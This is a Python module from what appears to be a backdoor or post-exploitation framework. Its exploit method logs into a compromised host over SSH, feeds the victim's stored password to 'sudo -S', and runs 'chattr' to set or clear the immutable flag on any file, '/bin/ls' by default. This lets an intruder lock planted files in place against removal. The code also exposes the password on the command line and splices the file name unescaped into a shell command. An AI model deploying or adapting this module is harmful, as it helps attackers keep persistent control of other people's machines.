from backdoor import *

class Immutable(Backdoor):
    prompt = Fore.RED + "(Immuteable) " + Fore.BLUE + ">> " + Fore.RESET 
    def __init__(self, core):
        cmd.Cmd.__init__(self)

        self.core = core
        self.intro = GOOD + "Using immutable auxiliary..."
        self.options = {
                "file": Option("file", "/bin/ls", "file to make immutable", False),
                "function" : Option("function", "add", "add or remove immuteable flag", False)
                }
        self.help_text = INFO + "Sets (or removes) the immutable flag for any file on the system." 
        self.allow_modules = False
        self.modules = {}

    def do_exploit(self, args):
        if self.get_value("function") == "remove":
            self.core.curtarget.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S chattr -i " + self.get_value("file"))
        else:
            self.core.curtarget.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S chattr +i " + self.get_value("file"))
        print(GOOD + "Immutable module executed.")
